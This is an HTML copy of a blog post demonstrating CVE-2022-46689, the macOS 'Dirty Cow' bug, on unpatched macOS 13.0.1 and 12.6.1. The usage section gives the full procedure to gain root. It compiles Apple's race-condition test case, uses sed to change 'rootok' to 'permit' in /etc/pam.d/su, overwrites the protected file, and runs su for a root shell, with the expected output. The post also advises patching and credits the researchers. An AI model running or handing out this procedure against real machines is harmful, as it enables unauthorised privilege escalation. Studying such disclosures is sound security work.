<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://worthdoingbadly.com/macdirtycow/">Original</a>
    <h1>Get root on macOS 13.0.1 the macOS Dirty Cow bug</h1>
    
    <div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>Get root on macOS 13.0.1 with <a href="https://support.apple.com/en-us/HT213532">CVE-2022-46689</a> (macOS equivalent of the Dirty Cow bug), using the testcase extracted from <a href="https://github.com/apple-oss-distributions/xnu/blob/xnu-8792.61.2/tests/vm/vm_unaligned_copy_switch_race.c">Apple’s XNU source</a>.</p>

<h2 id="usage">Usage</h2>

<p>On a macOS 13.0.1 / 12.6.1 (or below) machine, clone the extracted test case:</p>

<p>git clone <a href="https://github.com/zhuowei/MacDirtyCowDemo">https://github.com/zhuowei/MacDirtyCowDemo</a></p>

<p>Then run:</p>

<div><div><pre><code>clang -o switcharoo vm_unaligned_copy_switch_race.c
sed -e &#34;s/rootok/permit/g&#34; /etc/pam.d/su &gt; overwrite_file.bin
./switcharoo /etc/pam.d/su overwrite_file.bin
su
</code></pre></div></div>

<p>You should get:</p>

<div><div><pre><code>% ./switcharoo /etc/pam.d/su overwrite_file.bin
Testing for 10 seconds...
RO mapping was modified
% su
sh-3.2# 
</code></pre></div></div>

<p>Tested on macOS 13 beta (22A5266r) with SIP off (it should still work with SIP on).</p>

<p>If your system is fully patched (macOS 13.1 / 12.6.2), it should instead read:</p>

<div><div><pre><code>$ ./switcharoo /etc/pam.d/su overwrite_file.bin
Testing for 10 seconds...
vm_read_overwrite: KERN_SUCCESS:9865 KERN_PROTECTION_FAILURE:3840 other:0
Ran 13705 times in 10 seconds with no failure
</code></pre></div></div>

<p>and running <code>su</code> should still ask for a password.</p>

<p>Thanks to Sealed System Volume, running this on any file on the <code>/System</code> volume only modifies the file temporarily: It’s reverted on reboot. Running it on a file on a writeable volume will preserve the modification after a reboot.</p>

<h2 id="should-i-be-worried">Should I be worried?</h2>

<p>If you installed the latest macOS update (macOS 13.1 / 12.6.2 / 11.7.2), you should be fine.</p>

<p>If you haven’t, do it now.</p>

<h2 id="will-this-be-useful-for-ios-jailbreak">Will this be useful for iOS jailbreak?</h2>

<p>Probably not.</p>

<p>This - as far as I can tell - affects userspace processes only. Jailbreaks require a kernel exploit. (The Apple Security release notes says that this bug may allow “arbitrary code with kernel privileges”, but I can’t see how.)</p>

<p>You might still do something cool on iOS with this, but I’m not sure what you’d overwrite: codesigning should protect all executables and libraries. (I have not tested this: let me know if you find anything!)</p>

<h2 id="credits">Credits</h2>

<ul>
  <li>Ian Beer of <a href="https://googleprojectzero.blogspot.com/">Project Zero</a> for finding this issue, and for finding <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2337#c3">other issues in XNU’s virtual memory</a>. Looking forward to the writeup for this issue.</li>
  <li>Apple for the <a href="https://github.com/apple-oss-distributions/xnu/blob/xnu-8792.61.2/tests/vm/vm_unaligned_copy_switch_race.c">test case</a> and <a href="https://github.com/apple-oss-distributions/xnu/blob/xnu-8792.61.2/osfmk/vm/vm_map.c#L10150">patch</a>. (I didn’t change anything: I just added the command line parameter to control what to overwrite.)</li>
  <li><a href="https://gts3.org/assets/papers/2020/jin:pwn2own2020-safari-slides.pdf">SSLab@Gatech</a> for the trick to disable password checking using <code>/etc/pam.d</code>.</li>
  <li><a href="https://twitter.com/WangTielei/status/1603963997618855937">@WangTielei</a> for sharing a related issue and answering my questions.</li>
</ul>

<h2 id="changelog">Changelog</h2>

<p>2022-12-17:</p>

<ul>
  <li>clarified that “jailbreak” refers to iOS.</li>
  <li>clarified that the Project Zero issue link goes to a different issue than this one.</li>
  <li>link the patch in <code>vm_map_copy_overwrite_unaligned</code>.</li>
</ul>

  </div>
</article>

      </div>
      
    </div></div>
  </body>
</html>
